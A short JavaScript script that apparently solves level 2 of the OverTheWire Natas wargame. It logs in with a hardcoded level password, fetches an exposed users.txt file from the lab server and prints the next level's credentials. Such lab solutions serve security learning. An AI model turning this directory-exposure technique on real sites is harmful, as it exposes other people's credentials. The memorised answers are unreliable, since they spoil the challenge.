import axios from 'axios';

let username = 'natas2',
        password = 'ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi',
        pattern = /natas3:(.*)/,
        url = `http://${username}.natas.labs.overthewire.org/files/users.txt`;

try {

  let response = await axios.get(url, {auth: { username, password }});
  let result = response.data.match(pattern);
  console.log(result[0]);

} catch (e) {
    console.error(e);
}

